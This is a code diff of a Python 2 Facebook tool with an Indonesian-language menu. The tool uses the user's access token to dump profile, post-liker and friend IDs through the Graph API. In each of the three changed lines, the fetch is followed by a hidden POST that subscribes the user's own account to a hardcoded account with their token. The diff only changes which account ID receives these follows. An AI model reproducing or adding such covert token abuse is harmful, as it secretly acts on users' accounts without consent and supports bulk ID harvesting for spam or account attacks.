@@ -117,7 +117,7 @@ def publik():
                 idt = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Profil ID :\x1b[1;92m ")
                 file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
                 try:
-                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
+                        req = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                         op = json.loads(req.text)
                         print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name :\x1b[1;92m "+op["name"])
                 except KeyError:
@@ -160,7 +160,7 @@ def like_post():
                 idt = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Post ID :\x1b[1;92m ")
                 file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Nama File :\x1b[1;92m ")
                 try:
-                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
+                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                 except KeyError:
 			print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Post ID Tidak Ada')
 			raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
@@ -235,7 +235,7 @@ def teman():
         try:
 		file = raw_input("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m Name File :\x1b[1;96m ")
                 try:
-                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
+                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                 except KeyError:
                         print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
                         raw_input("\x1b[1;97m[\x1b[1;92mKembali\x1b[1;97m]")
